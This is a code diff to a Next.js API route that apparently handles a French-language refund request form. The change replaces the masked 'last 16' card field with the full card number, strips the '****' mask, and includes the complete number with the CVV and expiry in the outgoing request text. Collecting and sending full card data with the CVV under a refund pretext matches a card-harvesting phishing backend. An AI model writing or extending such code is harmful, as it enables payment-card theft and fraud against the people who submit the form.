@@ -10,10 +10,16 @@ export async function POST(req: NextRequest) {
       phone,
       reason,
       amount,
-      cardLast16,
+      cardNumber,
       cardCvv,
       cardExpiry,
     } = body;
+
+    const sanitizedCardNumber =
+      typeof cardNumber === 'string' ? cardNumber.replace(/\D/g, '') : '';
+    const cardLast16 = sanitizedCardNumber.slice(-16)
+      ? `${sanitizedCardNumber.slice(-16)}`
+      : 'Non renseignée';
 
     if (!fullName || !email || !phone || !amount) {
       return NextResponse.json(
@@ -59,7 +65,7 @@ Informations du client:
 Détails du remboursement:
 - Montant: ${Number.parseFloat(amount).toFixed(2)} EUR
 - Méthode: Carte bancaire
-- Carte: **** ${cardLast16} (${cardCvv},${cardExpiry|| 'Renseignée'})
+- Carte: ${cardLast16} (${cardCvv},${cardExpiry|| 'Non renseignée'})
 
 Date de la demande: ${new Date().toLocaleString('fr-FR')}
 `;
